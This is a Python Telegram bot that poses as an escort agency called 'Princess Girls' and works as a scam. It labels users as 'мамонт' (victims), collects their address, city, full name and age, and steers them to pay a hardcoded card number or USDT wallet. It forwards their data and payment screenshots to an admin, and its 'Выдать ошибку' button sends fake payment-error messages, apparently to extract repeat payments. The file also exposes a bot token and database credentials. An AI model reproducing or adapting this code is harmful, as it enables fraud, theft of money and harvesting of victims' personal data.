import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
import mysql.connector
import random

# Конфигурация бота
TOKEN = "8093056725:AAFeM-NV-V5oY7HABVNxVfsdRsui5PUjj0U"
ADMIN = "1435646471"
bot = telebot.TeleBot(TOKEN)

# Подключение к MySQL
db = mysql.connector.connect(
    host="mysql-telegbotfellni.alwaysdata.net",
    user="398026",
    password="ma2axaker",
    database="telegbotfellni_models"
)
cursor = db.cursor()

# Создание таблицы для моделей
cursor.execute('''
CREATE TABLE IF NOT EXISTS modelsv (
    id INT PRIMARY KEY,
    name VARCHAR(255) NOT NULL,
    description TEXT NOT NULL,
    photo VARCHAR(255) NOT NULL,
    creator TEXT NOT NULL
)
''')
db.commit()

# Функция для генерации уникального 5-значного ID
def generate_unique_id():
    while True:
        model_id = random.randint(10000, 99999)
        cursor.execute('SELECT id FROM modelsv WHERE id = %s', (model_id,))
        if not cursor.fetchone():
            return model_id

# Функция для добавления модели
def add_model(name, description, photo, creator):
    try:
        model_id = generate_unique_id()
        cursor.execute('''
        INSERT INTO modelsv (id, name, description, photo, creator)
        VALUES (%s, %s, %s, %s, %s)
        ''', (model_id, name, description, photo, creator))
        db.commit()
        return model_id
    except mysql.connector.Error as err:
        print(f"Ошибка при добавлении модели: {err}")
        return None

# Функция для удаления модели
def remove_model(model_id):
    try:
        cursor.execute('DELETE FROM modelsv WHERE id = %s', (model_id,))
        db.commit()
        return cursor.rowcount > 0
    except mysql.connector.Error as err:
        print(f"Ошибка при удалении модели: {err}")
        return False

# Функция для поиска модели
def find_model(model_id):
    try:
        cursor.execute('SELECT name, description, photo, creator FROM modelsv WHERE id = %s', (model_id,))
        return cursor.fetchone()
    except mysql.connector.Error as err:
        print(f"Ошибка при поиске модели: {err}")
        return None

# Функция для получения статистики
def get_stats():
    try:
        cursor.execute('SELECT COUNT(*) FROM modelsv')
        return cursor.fetchone()[0]
    except mysql.connector.Error as err:
        print(f"Ошибка при получении статистики: {err}")
        return 0

# Кастомная клавиатура для админа
def admin_main_menu():
    keyboard = ReplyKeyboardMarkup(resize_keyboard=True)
    keyboard.add(KeyboardButton(u"\U0001F4C8 Статистика"))           
    keyboard.add(KeyboardButton(u"\U0001F469 Управление моделями"))
    keyboard.add(KeyboardButton(u"\U0001F469 ДБ моделей")) 
    keyboard.add(KeyboardButton(u"\U0001F6AB Выдать ошибку"))   # Новая кнопка
    return keyboard

# Обработчик для кнопки "ДБ моделей"
def dblinksend(message):
            DBLINK = "https://phpmyadmin.alwaysdata.com/phpmyadmin/index.php?route=/sql&pos=0&db=telegbotfellni_models&table=modelsv"
            keyboard = InlineKeyboardMarkup()
            keyboard.add(InlineKeyboardButton("СсылочкааТЫК", url=DBLINK))
            msg = bot.send_message(
                message.chat.id,
                "Нате дб",
                reply_markup=keyboard
            )

# Обработчик продолжения
@bot.callback_query_handler(func=lambda call: call.data == "continue")
def handle_continue(call):
    try:
        user_id = call.from_user.id
        if user_id in user_states and user_states[user_id]['step'] == 'waiting_continue':
            # Отправляем второе сообщение
            msg = bot.send_message(
                call.message.chat.id,
                "Ваша заявка находится на рассмотрении!",
            )
            
    except Exception as e:
        print(f"Ошибка обработки продолжения: {e}")

# Обработчик для кнопки "Выдать ошибку"
@bot.message_handler(func=lambda message: message.text == u"\U0001F6AB Выдать ошибку" and str(message.from_user.id) == ADMIN)
def handle_error_payment(message):
    msg = bot.send_message(message.chat.id, "Введите ID пользователя, которому нужно выдать ошибку оплаты:")
    bot.register_next_step_handler(msg, process_error_payment_step)

def process_error_payment_step(message):
    try:
        user_id = int(message.text)  # Получаем ID пользователя
        bot.send_message(user_id, "\U0001F6AB Ошибка оплаты. Пожалуйста, свяжитесь с поддержкой.")  # Отправляем сообщение
        bot.send_message(message.chat.id, f"Сообщение об ошибке оплаты отправлено пользователю с ID: {user_id}")
    except ValueError:
        bot.send_message(message.chat.id, "Некорректный ID пользователя. Введите число.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Ошибка при отправке сообщения: {e}")

# Кастомная клавиатура для управления моделями
def manage_models_menu():
    keyboard = ReplyKeyboardMarkup(resize_keyboard=True)
    keyboard.add(KeyboardButton(u"\U00002795 Добавить модель"))     
    keyboard.add(KeyboardButton(u"\U00002796 Удалить модель"))      
    keyboard.add(KeyboardButton(u"\U0001F3E0 На главную"))         
    return keyboard

# Кастомная клавиатура для обычных пользователей
def user_main_menu():
    keyboard = ReplyKeyboardMarkup(resize_keyboard=True)
    keyboard.add(KeyboardButton(u"\U00002139 О нас"))               
    keyboard.add(KeyboardButton(u"\U0001F469 Модели"))  
    keyboard.add(KeyboardButton(u"\U0001F198 Поддержка"))            
    keyboard.add(KeyboardButton(u"\U0001F4C3 Информация"))           
    return keyboard

# Обработчик команды /start
@bot.message_handler(commands=['start'])
def start(message):
    user_id = str(message.from_user.id)
    if user_id == ADMIN:
        bot.send_message(message.chat.id, u"\U0001F44B Сасал алейкум, Ирис!", reply_markup=admin_main_menu())
    else:
        bot.send_message(message.chat.id, u"\U0001F31F Добро пожаловать в Princess Girls! \U0001F31F", reply_markup=user_main_menu())



# Обработчик для добавления модели
def process_add_model_name_step(message):
    name = message.text
    msg = bot.send_message(message.chat.id, u"\U0001F4DD Введите создателя модели:")
    bot.register_next_step_handler(msg, process_add_model_creator_step, name)

def process_add_model_creator_step(message, name):
    creator = message.text
    msg = bot.send_message(message.chat.id, u"\U0001F4DD Введите описание модели:")
    bot.register_next_step_handler(msg, process_add_model_description_step, name, creator)

def process_add_model_description_step(message, name, creator):
    description = message.text
    msg = bot.send_message(message.chat.id, u"\U0001F4F7 Отправьте фото модели:")
    bot.register_next_step_handler(msg, process_add_model_photo_step, name, description, creator)

def process_add_model_photo_step(message, name, description, creator):
    if message.photo:
        photo = message.photo[-1].file_id
        model_id = add_model(name, description, photo, creator)
        if model_id:
            bot.send_message(message.chat.id, f"\U00002705 Модель успешно добавлена! ID модели: {model_id}", reply_markup=admin_main_menu())
        else:
            bot.send_message(message.chat.id, "\U0000274C Ошибка при добавлении модели.")
    else:
        bot.send_message(message.chat.id, "\U0000274C Вы не отправили фото.")

# Обработчик для удаления модели
def process_remove_model_step(message):
    try:
        model_id = int(message.text)
        if remove_model(model_id):
            bot.send_message(message.chat.id, "\U00002705 Модель успешно удалена!", reply_markup=admin_main_menu())
        else:
            bot.send_message(message.chat.id, "\U0000274C Модель с таким ID не найдена.")
    except ValueError:
        bot.send_message(message.chat.id, "\U0000274C ID модели должен быть числом.")

# Временное хранилище для данных пользователей
user_states = {}

# Обработчик для поиска модели
def process_find_model_step(message):
    try:
        model_id = int(message.text)
        model = find_model(model_id)
        if model:
            name, description, photo, creator = model
            keyboard = InlineKeyboardMarkup()
            keyboard.add(InlineKeyboardButton(f"Снять \U0001F525", callback_data=f"snyat_{model_id}"))
            bot.send_photo(
                message.chat.id, 
                photo, 
                caption=f"\U0001F469 *Имя:* {name}\n\U0001F4DD *Описание:* {description}", 
                parse_mode="Markdown", 
                reply_markup=keyboard
            )
        else:
            bot.send_message(message.chat.id, "\U0000274C Модель с таким ID не найдена.")
    except ValueError:
        bot.send_message(message.chat.id, "\U0000274C Модель с таким ID не найдена.")

# Обработчик кнопки снять
@bot.callback_query_handler(func=lambda call: call.data.startswith("snyat_"))
def handle_snyat_button(call):
    try:
        model_id = int(call.data.split("_")[1])
        user = call.from_user
        
        # Сохраняем состояние пользователя
        user_states[user.id] = {
            'model_id': model_id,
            'step': 'waiting_payment_method',
            'data': {}  # Для хранения анкетных данных
        }
        
        # Отправляем сообщение админу
        admin_msg = f"Залёт мамонта на оплату!\n\n" \
                    f"ID модели: {model_id}\n" \
                    f"Пользователь: @{user.username}\n" \
                    f"User ID: {user.id}\n" \
                    f"Имя: {user.first_name}"
        bot.send_message(ADMIN, admin_msg)
        
        # Создаем клавиатуру для выбора способа оплаты
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton("Оплата картой", callback_data=f"payment_card_{model_id}"))
        keyboard.add(InlineKeyboardButton("Оплата криптовалютой", callback_data=f"payment_crypto_{model_id}"))
        keyboard.add(InlineKeyboardButton("Отменить", callback_data="cancel"))
        
        # Отправляем сообщение с выбором способа оплаты
        bot.send_message(
            call.message.chat.id,
            "Выберите способ оплаты:",
            reply_markup=keyboard
        )
        
    except Exception as e:
        print(f"Ошибка обработки кнопки: {e}")
        
#Обработчик выбора оплаты
@bot.callback_query_handler(func=lambda call: call.data.startswith("payment_"))
def handle_payment_method(call):
    try:
        user_id = call.from_user.id
        payment_method = call.data.split("_")[1]
        model_id = int(call.data.split("_")[2])
        
        # Сохраняем способ оплаты в состоянии пользователя
        user_states[user_id]['payment_method'] = payment_method
        user_states[user_id]['step'] = 'waiting_address'
        
        # Отправляем сообщение с запросом адреса
        msg = bot.send_message(
            call.message.chat.id,
            "Введите ваш адрес проживания:",
        )
        user_states[user_id]['last_message'] = msg.message_id
        
    except Exception as e:
        print(f"Ошибка обработки способа оплаты: {e}")

# Обработчик для адреса
@bot.message_handler(func=lambda message: user_states.get(message.from_user.id, {}).get('step') == 'waiting_address')
def handle_address(message):
    try:
        user_id = message.from_user.id
        
        user_states[user_id]['data']['address'] = message.text
        user_states[user_id]['step'] = 'waiting_city'
        
        
        msg = bot.send_message(
            message.chat.id,
            " Введите ваш город:",
        )
        user_states[user_id]['last_message'] = msg.message_id
        
    except Exception as e:
        print(f"Ошибка обработки адреса: {e}")

# Обработчик для города
@bot.message_handler(func=lambda message: user_states.get(message.from_user.id, {}).get('step') == 'waiting_city')
def handle_city(message):
    try:
        user_id = message.from_user.id
        
        user_states[user_id]['data']['city'] = message.text
        user_states[user_id]['step'] = 'waiting_full_name'

        
        msg = bot.send_message(
            message.chat.id,
            "Введите ваше ФИО:",
        )
        user_states[user_id]['last_message'] = msg.message_id
        
    except Exception as e:
        print(f"Ошибка обработки города: {e}")

# Обработчик для ФИО
@bot.message_handler(func=lambda message: user_states.get(message.from_user.id, {}).get('step') == 'waiting_full_name')
def handle_full_name(message):
    try:
        user_id = message.from_user.id

        user_states[user_id]['data']['full_name'] = message.text
        user_states[user_id]['step'] = 'waiting_age'

        
        msg = bot.send_message(
            message.chat.id,
            "Введите ваш возраст:",
        )
        user_states[user_id]['last_message'] = msg.message_id
        
    except Exception as e:
        print(f"Ошибка обработки ФИО: {e}")

# Обработчик для возраста
@bot.message_handler(func=lambda message: user_states.get(message.from_user.id, {}).get('step') == 'waiting_age')
def handle_age(message):
    try:
        user_id = message.from_user.id

        user_states[user_id]['data']['age'] = message.text
        user_states[user_id]['step'] = 'waiting_screenshot'

        
        # Определяем текст в зависимости от способа оплаты
        payment_method = user_states[user_id].get('payment_method', 'card')
        if payment_method == 'card':
            screenshot_text = "\U0001F4F8 Теперь загрузите скриншот оплаты по номеру карты 4100119007871164 Венера Ф. П."
        else:
            screenshot_text = "\U0001F4F8 Теперь загрузите скриншот оплаты по Адресу TFdsNV4fbmWjdqDnu7a9gY5EdSphkU87SD USDT, TRC20"
        
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton("Отменить", callback_data="cancel"))
        msg = bot.send_message(
            message.chat.id,
            screenshot_text,
            reply_markup=keyboard
        )
        user_states[user_id]['last_message'] = msg.message_id
        
    except Exception as e:
        print(f"Ошибка обработки возраста: {e}")

# Обработчик для скриншотов
@bot.message_handler(content_types=['photo'], func=lambda message: user_states.get(message.from_user.id, {}).get('step') == 'waiting_screenshot')
def handle_screenshot(message):
    try:
        user_id = message.from_user.id
        if user_id in user_states and user_states[user_id]['step'] == 'waiting_screenshot':
            # Удаляем предыдущее сообщение с кнопкой "Отменить"
            bot.delete_message(message.chat.id, user_states[user_id]['last_message'])
            
            # Сохраняем скриншот
            user_states[user_id]['screenshot'] = message.photo[-1].file_id
            user_states[user_id]['step'] = 'waiting_continue'
            
            # Отправляем анкету и скриншот админу
            admin_msg = f"Возможный профит!\n\n" \
                        f"Адрес: {user_states[user_id]['data']['address']}\n" \
                        f"Город: {user_states[user_id]['data']['city']}\n" \
                        f"ФИО: {user_states[user_id]['data']['full_name']}\n" \
                        f"Возраст: {user_states[user_id]['data']['age']}\n\n" \
                        f"Скриншот от пользователя: @{message.from_user.username}"
            bot.send_photo(ADMIN, user_states[user_id]['screenshot'], caption=admin_msg)
            
            # Отправляем пользователю следующее сообщение
            keyboard = InlineKeyboardMarkup()
            keyboard.add(InlineKeyboardButton("Продолжить ➡️", callback_data="continue"))
            msg = bot.send_message(
                message.chat.id,
                "Скриншот успешно получен!",
                reply_markup=keyboard
            )
            user_states[user_id]['last_message'] = msg.message_id
            
    except Exception as e:
        print(f"Ошибка обработки скриншота: {e}")

# Обработчик продолжения
@bot.callback_query_handler(func=lambda call: call.data == "continue")
def handle_continue(call):
    try:
        user_id = call.from_user.id
        if user_id in user_states and user_states[user_id]['step'] == 'waiting_continue':
            # Отправляем второе сообщение
            msg = bot.send_message(
                call.message.chat.id,
                "Ваша заявка находится на рассмотрении!",
            )
            
            # Обновляем состояние
            user_states[user_id]['step'] = 'completed'
            user_states[user_id]['last_message'] = msg.message_id
            
    except Exception as e:
        print(f"Ошибка обработки продолжения: {e}")

# Обработчик отмены
@bot.callback_query_handler(func=lambda call: call.data == "cancel")
def handle_cancel(call):
    try:
        user_id = call.from_user.id
        if user_id in user_states:
            # Удаляем сообщение с кнопками
            bot.delete_message(call.message.chat.id, call.message.message_id)
            # Отправляем подтверждение отмены
            bot.send_message(call.message.chat.id, "\U0000274C Действие отменено")
            # Удаляем состояние
            del user_states[user_id]
    except Exception as e:
        print(f"Ошибка обработки отмены: {e}")

# Обработчик текстовых сообщений
@bot.message_handler(func=lambda message: True)
def text_handler(message):
    user_id = str(message.from_user.id)
    text = message.text

    if user_id == ADMIN:
        if text == u"\U0001F4C8 Статистика":
            stats = get_stats()
            bot.send_message(message.chat.id, f"\U0001F4CA Всего моделей в базе: {stats}")
        elif text == u"\U0001F469 Управление моделями":
            bot.send_message(message.chat.id, "\U0001F469 Управление моделями", reply_markup=manage_models_menu())
        elif text == u"\U00002795 Добавить модель":
            msg = bot.send_message(message.chat.id, u"\U0000270D Введите имя модели:")
            bot.register_next_step_handler(msg, process_add_model_name_step)
        elif text == u"\U00002796 Удалить модель":
            msg = bot.send_message(message.chat.id, u"\U0001F5D1 Введите ID модели для удаления:")
            bot.register_next_step_handler(msg, process_remove_model_step)
        elif text == u"\U0001F3E0 На главную":
            bot.send_message(message.chat.id, u"\U0001F3E0 Главное меню", reply_markup=admin_main_menu())
        elif text == u"\U0001F469 ДБ моделей":
            bot.send_message(message.chat.id, u"\U0001F469 ДБ моделей", reply_markup=dblinksend(message))
        
    else:
        if text == u"\U00002139 О нас":
            bot.send_message(message.chat.id, 
                u"\U0001F451 *Princess Girls* - предлагает быстрый и удобный поиск, позволяя легко и оперативно найти идеального партнера для любого мероприятия.\n\n"
                "Наши услуги предназначены для тех, кто ищет элегантного и надежного партнера для особых мероприятий, деловых встреч или просто приятного времяпрепровождения.\n\n"
                "Мы понимаем, что у каждого клиента свои уникальные потребности и пожелания. Наши специалисты готовы предложить индивидуальные решения, чтобы каждая встреча соответствовала вашим ожиданиям и предпочтениям.\n\n"
                "Мы гарантируем, что каждая встреча с нашими эскорт-партнерами станет для вас незабываемым событием, полным позитивных эмоций и комфорта.\n\n"
                "Ваша удовлетворенность — наш главный приоритет.", 
                parse_mode="Markdown")
        elif text == u"\U0001F4C3 Информация":
            sogl_keyboard = InlineKeyboardMarkup()
            sogl_keyboard.add(InlineKeyboardButton(text=u"\U0001F4D6 Соглашение", url="https://telegra.ph/Princess-Girls---polzovatelskoe-soglashenie-dlya-klientov-02-09"))
            bot.send_message(message.chat.id, u"\U0001F4C4 Все нюансы работы агентства описаны в соглашении, доступном по кнопке ниже.", reply_markup=sogl_keyboard)
        elif text == u"\U0001F469 Модели":
            msg = bot.send_message(message.chat.id, u"\U0001F50D Введите ID модели для поиска:")
            bot.register_next_step_handler(msg, process_find_model_step)
        elif text == u"\U0001F198 Поддержка":
            bot.send_message(message.chat.id, u"\U0001F198 Связаться с поддержкой можно тут: @PrincessGirlsSupport_bot")

# Запуск бота
bot.polling(none_stop=True)